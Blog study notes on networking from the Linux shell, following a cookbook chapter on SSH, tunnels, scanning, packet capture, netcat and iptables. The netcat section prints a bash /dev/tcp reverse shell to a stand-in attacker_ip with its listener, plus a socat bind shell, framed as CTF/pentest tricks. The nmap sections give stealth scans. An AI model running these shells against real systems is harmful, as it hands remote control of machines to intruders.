---
layout: post
title: Chapter 7 The Old-Boy Network
date: 2026-04-07T10:00:00
categories:
  - Linux Shell Scripting
tags:
  - linuxcli
  - linux
  - bash
  - scripting
  - networking
  - ssh
  - iptables
author: muhammed
description: Chapter 7 of Linux Shell Scripting Cookbook — networking from the command line, SSH, port forwarding, firewalls, and traffic analysis
toc: true
pin: false
math: false
mermaid: false
image: https://media.licdn.com/dms/image/v2/D4D12AQG85GEyaMcdzg/article-cover_image-shrink_720_1280/article-cover_image-shrink_720_1280/0/1715198365363?e=2147483647&v=beta&t=zSE3QFqa_pLtDmQbUv_4HvOAvufhMvrOVzRy6lWimHE
Link: "[[Shell Scripting Notes]]"
---

# Chapter Overview

This chapter covers everything networking from the shell — configuring interfaces, probing the network, SSH tunnelling, file transfer, firewalls, and traffic analysis. Most of these tools are what you'd reach for during a CTF, a pentest, or just managing remote infrastructure.

---

## Setting Up the Network

### ip — the modern tool (replaces ifconfig)

```bash
ip addr                          # show all interfaces and IPs
ip addr show eth0                # show specific interface
ip link show                     # show link state (up/down, MAC)
ip route                         # show routing table
ip route show default            # show default gateway
ip neigh                         # ARP table (neighbour cache)
```

**Assign an IP address:**

```bash
ip addr add 192.168.1.100/24 dev eth0     # add IP to interface
ip addr del 192.168.1.100/24 dev eth0     # remove IP
ip link set eth0 up                        # bring interface up
ip link set eth0 down                      # bring interface down
```

**Add a route:**

```bash
ip route add 10.0.0.0/8 via 192.168.1.1      # static route
ip route add default via 192.168.1.1          # default gateway
ip route del 10.0.0.0/8                       # delete route
```

### ifconfig (legacy — still common)

```bash
ifconfig                         # show all interfaces
ifconfig eth0                    # show one interface
ifconfig eth0 192.168.1.100 netmask 255.255.255.0  # assign IP
ifconfig eth0 up                 # bring up
ifconfig eth0 down               # bring down
```

### DNS configuration

```bash
cat /etc/resolv.conf             # current DNS servers
```

Temporary DNS change:

```bash
echo "nameserver 8.8.8.8" > /etc/resolv.conf
echo "nameserver 1.1.1.1" >> /etc/resolv.conf
```

Permanent (NetworkManager):

```bash
nmcli con mod "Connection Name" ipv4.dns "8.8.8.8 1.1.1.1"
nmcli con up "Connection Name"
```

### hostname

```bash
hostname                         # show current hostname
hostname -I                      # show all local IPs
hostnamectl set-hostname newname # change hostname permanently
```

### Network diagnostics

```bash
ss -tuln                         # listening sockets (replaces netstat)
ss -tulnp                        # with process names
netstat -tuln                    # classic equivalent (install net-tools)
cat /proc/net/if_inet6           # IPv6 interfaces
```

---

## Ping

`ping` tests reachability and measures round-trip time using ICMP echo requests.

```bash
ping google.com                  # continuous ping (Ctrl+C to stop)
ping -c 4 google.com             # send exactly 4 packets
ping -i 0.5 google.com           # interval between pings (0.5s)
ping -s 1000 google.com          # packet size 1000 bytes
ping -t 64 google.com            # TTL (time to live)
ping -W 2 google.com             # timeout per packet (2s)
ping -q google.com               # quiet — only show summary
```

**Flood ping** (requires root — stress test):

```bash
ping -f -c 1000 192.168.1.1     # send 1000 pings as fast as possible
```

**Ping sweep — check a whole subnet:**

```bash
for i in {1..254}; do
  ping -c 1 -W 1 192.168.1.$i > /dev/null 2>&1 && echo "UP: 192.168.1.$i"
done
```

**IPv6:**

```bash
ping6 ::1                        # ping localhost over IPv6
ping6 google.com
```

### Traceroute

```bash
traceroute google.com            # hop-by-hop path
tracepath google.com             # like traceroute, no root required
mtr google.com                   # real-time traceroute (combines ping + traceroute)
```

`mtr` is the best tool for diagnosing where latency or packet loss is occurring on a path.

---

## Listing All Live Machines on a Network

### Ping sweep (bash)

```bash
#!/bin/bash
network="192.168.1"

for host in {1..254}; do
  ping -c 1 -W 1 "$network.$host" > /dev/null 2>&1 && \
    echo "$network.$host is UP"
done
```

**Parallel version (much faster):**

```bash
#!/bin/bash
network="192.168.1"

for host in {1..254}; do
  (ping -c 1 -W 1 "$network.$host" > /dev/null 2>&1 && \
    echo "$network.$host is UP") &
done
wait
```

### nmap (the proper tool)

```bash
nmap -sn 192.168.1.0/24          # ping sweep (host discovery only)
nmap -sn 192.168.1.0/24 --open   # only show responding hosts
nmap 192.168.1.0/24              # full scan with port info
nmap -sV 192.168.1.0/24          # detect services/versions
nmap -O 192.168.1.100            # OS detection
nmap -p 22,80,443 192.168.1.0/24 # specific ports across subnet
```

**Output to file:**

```bash
nmap -sn 192.168.1.0/24 -oN hosts.txt     # normal format
nmap -sn 192.168.1.0/24 -oG hosts.grep    # greppable format
nmap -sn 192.168.1.0/24 -oX hosts.xml     # XML
```

### arp-scan

```bash
arp-scan --localnet              # scan local network using ARP
arp-scan 192.168.1.0/24
```

ARP-based — more reliable than ping (ICMP can be blocked, ARP can't on a local network).

### Extract live IPs from nmap output

```bash
nmap -sn 192.168.1.0/24 | grep "report for" | awk '{print $NF}'
```

---

## Running Commands on Remote Hosts with SSH

```bash
ssh user@host                          # interactive shell
ssh user@host "command"                # run single command and exit
ssh user@host "ls -la /var/log"        # remote ls
ssh -p 2222 user@host                  # custom port
ssh -i ~/.ssh/mykey user@host          # specific private key
ssh -v user@host                       # verbose (debug connection issues)
```

### Run multiple commands

```bash
ssh user@host "cd /app && git pull && systemctl restart app"

# Heredoc for multi-line
ssh user@host << 'EOF'
  cd /var/www
  git pull origin main
  npm install
  pm2 restart app
EOF
```

### Run a script remotely

```bash
# Upload and execute
scp script.sh user@host:/tmp/
ssh user@host "bash /tmp/script.sh"

# Execute without uploading (pipe over SSH)
cat script.sh | ssh user@host "bash"
```

### SSH config file (`~/.ssh/config`)

Instead of typing long SSH commands, define shortcuts:

```
Host webserver
    HostName 192.168.1.100
    User omar
    Port 2222
    IdentityFile ~/.ssh/web_key

Host jumpbox
    HostName jump.example.com
    User admin
    ProxyJump webserver
```

```bash
ssh webserver                    # uses the config above
```

### Run commands on multiple hosts

```bash
for host in 192.168.1.{10..20}; do
  echo "=== $host ==="
  ssh -o ConnectTimeout=3 user@$host "uptime" 2>/dev/null
done
```

---

## Transferring Files Through the Network

### scp — secure copy

```bash
scp file.txt user@host:/remote/path/          # local → remote
scp user@host:/remote/file.txt /local/path/   # remote → local
scp -r /local/dir/ user@host:/remote/dir/     # recursive directory
scp -P 2222 file.txt user@host:/path/         # custom port (capital P)
scp -i ~/.ssh/key file.txt user@host:/path/   # specific key
```

### rsync over SSH (preferred for large transfers)

```bash
rsync -avz /local/ user@host:/remote/         # sync local to remote
rsync -avz -e "ssh -p 2222" /local/ user@host:/remote/  # custom port
rsync -avzP user@host:/remote/ /local/        # -P shows progress + resumes
```

### sftp — interactive file transfer

```bash
sftp user@host
```

Inside sftp:
```
ls                    # list remote directory
lls                   # list local directory
cd /remote/path       # change remote directory
lcd /local/path       # change local directory
get file.txt          # download file
put file.txt          # upload file
mget *.log            # download multiple files
mput *.conf           # upload multiple files
bye                   # exit
```

### curl/wget for downloading

```bash
wget https://example.com/file.tar.gz
curl -O https://example.com/file.tar.gz
```

### netcat for raw transfer

```bash
# Receiver (start first)
nc -l -p 9999 > received_file.tar.gz

# Sender
nc receiver_ip 9999 < file.tar.gz
```

Fast but no encryption — only use on trusted networks.

---

## Connecting to a Wireless Network

### iwconfig (legacy)

```bash
iwconfig                          # show wireless interfaces
iwconfig wlan0                    # show one interface
iwlist wlan0 scan                 # scan for networks
iwconfig wlan0 essid "NetworkName"  # connect to open network
```

### iw (modern replacement)

```bash
iw dev                            # list wireless devices
iw dev wlan0 scan                 # scan for available networks
iw dev wlan0 link                 # connection info (signal, SSID)
```

### nmcli (NetworkManager — recommended)

```bash
nmcli device wifi list            # list available networks
nmcli device wifi connect "SSID" password "password"  # connect
nmcli connection show             # show all saved connections
nmcli connection up "SSID"        # connect to saved network
nmcli connection down "SSID"      # disconnect
nmcli radio wifi off              # disable wifi
nmcli radio wifi on               # enable wifi
```

### wpa_supplicant (manual, no NetworkManager)

Configure `/etc/wpa_supplicant/wpa_supplicant.conf`:

```
network={
    ssid="NetworkName"
    psk="password"
    key_mgmt=WPA-PSK
}
```

```bash
wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf &
dhclient wlan0                    # get IP via DHCP
```

---

## Passwordless Auto-Login with SSH

SSH key authentication is faster, more secure, and required for automation — no password prompts.

### Step 1: Generate a key pair

```bash
ssh-keygen -t ed25519 -C "omar@machine"     # modern — recommended
ssh-keygen -t rsa -b 4096 -C "omar@machine" # RSA — wider compatibility
```

- Private key: `~/.ssh/id_ed25519` — never share this
- Public key: `~/.ssh/id_ed25519.pub` — this goes on the server

### Step 2: Copy public key to server

```bash
ssh-copy-id user@host                        # easiest method
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@host  # specify key
ssh-copy-id -p 2222 user@host               # custom port
```

**Manual method** (if ssh-copy-id isn't available):

```bash
cat ~/.ssh/id_ed25519.pub | ssh user@host "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
```

### Step 3: Set correct permissions (on the server)

```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

### Step 4: Test

```bash
ssh user@host                # should not ask for password
```

### ssh-agent (avoid re-entering passphrase)

```bash
eval $(ssh-agent)            # start agent
ssh-add ~/.ssh/id_ed25519    # add key (enter passphrase once)
ssh-add -l                   # list loaded keys
```

---

## Port Forwarding with SSH

SSH tunnels encrypt and forward network traffic through SSH connections. Useful for accessing services behind firewalls or NAT.

### Local port forwarding (-L)

Forward a local port to a remote service — you access it on your machine, traffic goes through SSH to the remote.

```bash
ssh -L 8080:localhost:80 user@server
```

Now `localhost:8080` on your machine reaches port 80 on the server.

**Access a database behind a firewall:**

```bash
ssh -L 3306:db-server:3306 user@jump-host
# Now connect to localhost:3306 to reach the remote MySQL
```

### Remote port forwarding (-R)

Expose a local service to the remote server — useful for making a local service accessible from the internet.

```bash
ssh -R 9090:localhost:3000 user@server
```

Now port 9090 on the server reaches port 3000 on your local machine.

### Dynamic port forwarding (-D) — SOCKS proxy

Creates a SOCKS proxy on your local machine — all traffic routed through it goes via the SSH server.

```bash
ssh -D 1080 user@server
```

Configure your browser to use SOCKS5 proxy at `localhost:1080`. All traffic appears to come from the server's IP.

**Use with curl:**

```bash
curl --socks5 localhost:1080 https://example.com
```

### Jump hosts (ProxyJump)

Access a machine that's only reachable via a jump host:

```bash
ssh -J jumpuser@jumphost finaluser@finalhost

# Multiple hops
ssh -J user@hop1,user@hop2 user@destination
```

### Persistent tunnels

Keep the tunnel running in the background:

```bash
ssh -fNL 8080:localhost:80 user@server
# -f = background, -N = no command (just forward)
```

---

## Mounting a Remote Drive at a Local Mount Point

### SSHFS — mount remote directory over SSH

```bash
# Mount
sshfs user@host:/remote/path /local/mountpoint

# With options
sshfs -p 2222 user@host:/remote /mnt/remote \
  -o reconnect,ServerAliveInterval=15,ServerAliveCountMax=3

# Unmount
fusermount -u /mnt/remote          # Linux
umount /mnt/remote                 # macOS
```

Install: `apt install sshfs`

**Mount on boot (`/etc/fstab`):**

```
user@host:/remote /mnt/remote fuse.sshfs defaults,_netdev,reconnect 0 0
```

### NFS — Network File System

```bash
# Server side
apt install nfs-kernel-server
echo "/shared/dir 192.168.1.0/24(rw,sync,no_subtree_check)" >> /etc/exports
exportfs -ra
systemctl start nfs-server

# Client side
mount -t nfs server:/shared/dir /mnt/nfs
# Or in /etc/fstab:
# server:/shared /mnt/nfs nfs defaults,_netdev 0 0
```

### SMB/CIFS — Windows shares

```bash
mount -t cifs //server/share /mnt/smb \
  -o username=user,password=pass,domain=DOMAIN

# With credentials file (more secure)
mount -t cifs //server/share /mnt/smb -o credentials=/etc/samba/creds
```

`/etc/samba/creds`:
```
username=user
password=secret
domain=WORKGROUP
```

---

## Network Traffic and Port Analysis

### ss — socket statistics (modern netstat)

```bash
ss -tuln                    # listening TCP and UDP ports
ss -tulnp                   # with process names (requires sudo)
ss -t state established     # established TCP connections
ss -s                       # summary statistics
ss -o                       # show timer info
```

### netstat (legacy, still useful)

```bash
netstat -tuln               # listening ports
netstat -tulnp              # with process
netstat -r                  # routing table
netstat -s                  # protocol statistics
```

### nmap for port scanning

```bash
nmap -sS 192.168.1.100      # SYN scan (stealth)
nmap -sT 192.168.1.100      # TCP connect scan
nmap -sU 192.168.1.100      # UDP scan
nmap -sV 192.168.1.100      # service/version detection
nmap -A 192.168.1.100       # aggressive (OS, version, scripts, traceroute)
nmap -p- 192.168.1.100      # all 65535 ports
nmap -p 22,80,443 192.168.1.100  # specific ports
```

### tcpdump — packet capture

```bash
tcpdump -i eth0                          # capture on eth0
tcpdump -i eth0 -w capture.pcap          # save to file (open in Wireshark)
tcpdump -i eth0 port 80                  # only HTTP traffic
tcpdump -i eth0 host 192.168.1.100       # traffic to/from specific host
tcpdump -i eth0 'tcp and port 443'       # HTTPS only
tcpdump -i eth0 -n                       # don't resolve hostnames
tcpdump -i eth0 -X port 80              # show hex + ASCII payload
tcpdump -i any                           # capture on all interfaces
```

### iftop — real-time bandwidth per connection

```bash
iftop                        # interactive bandwidth monitor
iftop -i eth0                # specific interface
iftop -n                     # no DNS lookups
```

### nethogs — bandwidth per process

```bash
nethogs                      # show which process uses the most bandwidth
nethogs eth0                 # specific interface
```

### nload — total bandwidth graph

```bash
nload                        # simple incoming/outgoing bandwidth graph
nload eth0
```

---

## Creating Arbitrary Sockets

### netcat (nc) — the network Swiss Army knife

**Listen on a port:**

```bash
nc -l -p 9999                # listen on TCP port 9999
nc -l -u -p 9999             # listen on UDP port 9999
```

**Connect to a port:**

```bash
nc host 9999                 # connect
nc -v host 9999              # verbose connection
nc -z host 9999              # port check only (zero I/O)
nc -w 3 -z host 9999         # with 3s timeout
```

**Port scanning with nc:**

```bash
nc -zv host 20-100           # scan ports 20-100
for port in 22 80 443 3306 8080; do
  nc -z -w 1 host $port 2>/dev/null && echo "$port open" || echo "$port closed"
done
```

**Simple chat (two terminals):**

```bash
# Terminal 1
nc -l -p 1234

# Terminal 2
nc localhost 1234
```

**Reverse shell (for CTFs/pentests):**

```bash
# Attacker (listener)
nc -lvnp 4444

# Victim (connects back)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### /dev/tcp — bash built-in TCP

Bash can open TCP connections natively without nc:

```bash
exec 3<>/dev/tcp/google.com/80
echo -e "GET / HTTP/1.0\r\nHost: google.com\r\n\r\n" >&3
cat <&3
exec 3>&-
```

**Quick port check without nc:**

```bash
timeout 1 bash -c "cat < /dev/null > /dev/tcp/host/port" 2>/dev/null && \
  echo "open" || echo "closed"
```

### socat — more powerful nc

```bash
socat TCP-LISTEN:9999,fork -          # listen and echo stdin
socat TCP:host:9999 -                 # connect
socat TCP-LISTEN:9999 EXEC:"/bin/bash"  # bind shell
socat TCP-LISTEN:443,fork,reuseaddr OPENSSL-LISTEN:443,cert=server.pem  # TLS listener
```

---

## Sharing an Internet Connection

### IP forwarding (NAT gateway)

Turn your Linux machine into a router — share one internet connection with other machines.

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Make it permanent
echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
sysctl -p

# NAT with iptables (eth0 = internet, eth1 = internal network)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT
```

Other machines on the internal network set their gateway to this machine's IP.

### NetworkManager hotspot

Share WiFi as a hotspot:

```bash
nmcli device wifi hotspot \
  con-name Hotspot \
  ssid "MyHotspot" \
  password "password123" \
  ifname wlan0
```

### iptables NAT for specific IPs

```bash
# Share internet with a specific internal subnet only
iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE
```

---

## Basic Firewall with iptables

`iptables` filters network packets based on rules. Rules are processed top to bottom — first match wins.

### Chains and tables

- **INPUT** — packets destined for the local machine
- **OUTPUT** — packets leaving the local machine
- **FORWARD** — packets being routed through the machine

### Viewing rules

```bash
iptables -L                          # list all rules
iptables -L -v -n                    # with packet counts, no DNS lookup
iptables -L INPUT -n --line-numbers  # with line numbers
iptables -t nat -L                   # NAT table
```

### Default policies

```bash
iptables -P INPUT DROP               # drop all incoming by default
iptables -P FORWARD DROP             # drop all forwarded by default
iptables -P OUTPUT ACCEPT            # allow all outgoing
```

### Allow rules (add before default DROP)

```bash
# Allow established/related connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP and HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow from specific IP only
iptables -A INPUT -s 192.168.1.50 -p tcp --dport 22 -j ACCEPT

# Allow ICMP (ping)
iptables -A INPUT -p icmp -j ACCEPT
```

### Block rules

```bash
iptables -A INPUT -s 192.168.1.100 -j DROP      # block an IP
iptables -A INPUT -p tcp --dport 23 -j DROP      # block Telnet
iptables -A INPUT -p tcp --dport 8080 -j REJECT  # reject (sends RST, not silent drop)
```

### Delete and flush rules

```bash
iptables -D INPUT 3                  # delete rule by line number
iptables -F                          # flush all rules (dangerous — loses all rules)
iptables -F INPUT                    # flush only INPUT chain
iptables -X                          # delete all custom chains
```

### Save and restore rules

```bash
iptables-save > /etc/iptables/rules.v4      # save
iptables-restore < /etc/iptables/rules.v4   # restore
```

Auto-restore on boot (Debian/Ubuntu):

```bash
apt install iptables-persistent
netfilter-persistent save
```

### Rate limiting (anti-brute-force)

```bash
# Allow SSH but limit to 3 connection attempts per minute per IP
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
```

### ufw — simplified iptables frontend

```bash
ufw enable                           # enable firewall
ufw disable                          # disable
ufw status verbose                   # show rules
ufw allow 22                         # allow SSH
ufw allow 80/tcp                     # allow HTTP
ufw deny 23                          # block Telnet
ufw allow from 192.168.1.0/24        # allow subnet
ufw delete allow 80                  # remove a rule
ufw reset                            # reset all rules
```

---

## 📚 References

<div class="references">
<ul>
  <li><a href="https://www.packtpub.com/product/linux-shell-scripting-cookbook/9781785881985" target="_blank">Linux Shell Scripting Cookbook — Packt</a></li>
  <li><a href="https://www.openssh.com/manual.html" target="_blank">OpenSSH Manual</a></li>
  <li><a href="https://nmap.org/book/man.html" target="_blank">Nmap Reference Guide</a></li>
  <li><a href="https://www.netfilter.org/documentation/" target="_blank">iptables/netfilter Documentation</a></li>
</ul>
</div>

---

##  You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **X (Twitter):** [Md3omer](https://x.com/Md3omer )
- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:**  [nonlouy](https://tryhackme.com/p/nonlouy)
